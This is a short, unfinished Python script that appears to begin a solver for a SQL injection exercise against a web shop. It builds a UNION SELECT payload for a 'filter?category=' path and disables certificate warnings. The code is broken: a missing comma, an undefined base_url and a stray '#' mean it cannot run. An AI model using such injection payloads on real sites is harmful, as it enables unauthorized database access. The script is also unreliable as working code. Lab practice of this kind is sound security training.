import sys
import logging
import argparse
import urllib3

import requests

import utils
from shop import Shop#

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{"
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main(args):
    shop = Shop()
    filter_path = "filter?category=' UNION SELECT {nulls}-- "
    requests.get(base_url)
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)